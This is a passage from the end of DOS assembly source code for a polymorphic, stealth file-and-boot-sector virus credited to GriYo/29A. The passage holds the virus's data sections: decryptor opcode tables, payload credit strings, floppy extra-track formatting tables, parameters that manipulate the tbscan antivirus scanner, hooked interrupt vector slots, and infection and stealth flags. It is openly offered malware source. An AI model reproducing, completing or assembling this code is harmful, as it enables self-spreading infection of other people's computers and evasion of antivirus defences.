                   ;Opcode table for add/sub/xor byte ptr seg:[di+displ],reg
                   db 2Ah,00h                      ;Add / sub
                   db 02h,28h                      ;Sub / add
                   db 32h,30h                      ;Xor / xor

   end_decrypt_table:

   fast_table:
                   ;Opcode table for add/sub/xor byte ptr seg:[di+displ],key
                   db 45h,2Ah                      ;Add / sub
                   db 6Dh,02h                      ;Sub / add
                   db 75h,32h                      ;Xor / xor
   end_fast_table:

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Virus buffers ( inserted into infections )                                ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


                           ;Text for payload subroutine
   txt_credits_1           db "<<< SuckSexee Automated Intruder >>>",00h
   txt_credits_2           db "Viral Implant Bio-Coded by GriYo/29A",00h

                           ;Ddpt that enables the extra track
   floppy5_25              db 0DFh,02h,25h,02h,0Fh,1Bh,0FFh,54h,0F6h,0Fh,08h
   floppy3_5               db 0DFh,02h,25h,02h,12h,1Bh,0FFh,6Ch,0F6h,0Fh,08h

                           ;Format table for a extra track in floppy
   format_table            db 50h,00h,01h,02h      ;Track 50h sector 01h
                           db 50h,00h,02h,02h      ;Track 50h sector 02h
                           db 50h,00h,03h,02h      ;Track 50h sector 03h
                           db 50h,00h,04h,02h      ;Track 50h sector 04h
                           db 50h,00h,05h,02h      ;Track 50h sector 05h
                           db 50h,00h,06h,02h      ;Track 50h sector 06h
                           db 50h,00h,07h,02h      ;Track 50h sector 07h
                           db 50h,00h,08h,02h      ;Track 50h sector 08h
                           db 50h,00h,09h,02h      ;Track 50h sector 09h
                           db 50h,00h,0Ah,02h      ;Track 50h sector 0Ah
                           db 50h,00h,0Bh,02h      ;Track 50h sector 0Bh
                           db 50h,00h,0Ch,02h      ;Track 50h sector 0Ch
                           db 50h,00h,0Dh,02h      ;Track 50h sector 0Dh
                           db 50h,00h,0Eh,02h      ;Track 50h sector 0Eh
                           db 50h,00h,0Fh,02h      ;Track 50h sector 0Fh

                           ;Command line parameters for win.com
   win_param_string        db " /d:f",0Dh

                           ;Command line parameters for tbscan.exe
   tbscan_param_string     db " co nm",0Dh

                           ;Old file header
   old_header              db file_header_size dup (00h)

                           ;Decryptor key
   clave_crypt             db 00h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Virus data buffer (not inserted into infections)                          ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   virus_data_buffer:
                           ;Old interrupt vectors

   old03h                  equ this dword
   old03h_off              dw 0000h
   old03h_seg              dw 0000h

   old12h                  equ this dword
   old12h_off              dw 0000h
   old12h_seg              dw 0000h

   old13h                  equ this dword
   old13h_off              dw 0000h
   old13h_seg              dw 0000h

   old1Ch                  equ this dword
   old1Ch_off              dw 0000h
   old1Ch_seg              dw 0000h

   old1Eh                  equ this dword
   old1Eh_off              dw 0000h
   old1Eh_seg              dw 0000h

   old21h                  equ this dword
   old21h_off              dw 0000h
   old21h_seg              dw 0000h

   org21h                  equ this dword
   org21h_off              dw 0000h
   org21h_seg              dw 0000h

   old24h                  equ this dword
   old24h_off              dw 0000h
   old24h_seg              dw 0000h

   old40h                  equ this dword
   old40h_off              dw 0000h
   old40h_seg              dw 0000h

                           ;Misc data

   read_ptr                equ this dword
   read_off                dw 0000h
   read_seg                dw 0000h

   poly_working_ptr        equ this dword
   poly_working_off        dw 0000h
   poly_working_seg        dw 0000h

   dos_function            dw 0000h
   file_offset             dw 0000h
   ret_off                 dw 0000h
   virus_timer             dw 0000h
   hd_write_words          dw 0000h
   hd_write_cl             db 00h
   hd_write_al             db 00h
   dos_flag                db 00h
   running_sw              db 00h
   stealth_sw              db 00h
   file_infection_flag     db 00h

                           ;Polymorphic decryptor data
   poly_data:
   last_fill_type          dw 0000h        ;+00h
   last_step_type          dw 0000h        ;+02h
   last_subroutine         dw 0000h        ;+04h
   decrypt_sub             dw 0000h        ;+06h
   address_loop            dw 0000h        ;+08h
   last_int_type           db 00h          ;+0Ah
   decrypt_pointer         db 00h          ;+0Bh
   address_register        db 00h          ;+0Ch
   decrypt_register        db 00h          ;+0Dh
   address_seg_1           db 00h          ;+0Eh
   address_seg_2           db 00h          ;+0Fh
   rnd_pointer             dw 0000h        ;+10h
   mem_base                dw 0000h        ;+12h
   displ_si_di             db 00h          ;+14h
   decrypt_seq             db 00h          ;+15h

                           ;Buffer for filename of executed program
   execute_filename        db 80h dup (00h)

                           ;Buffer for file stealth and infection routines
   file_buffer             db file_header_size dup (00h)
   virus_copy              db 00h
   virus_end_buffer:

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Done :P                                                                   ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   launcher        ends
                   end virus_entry
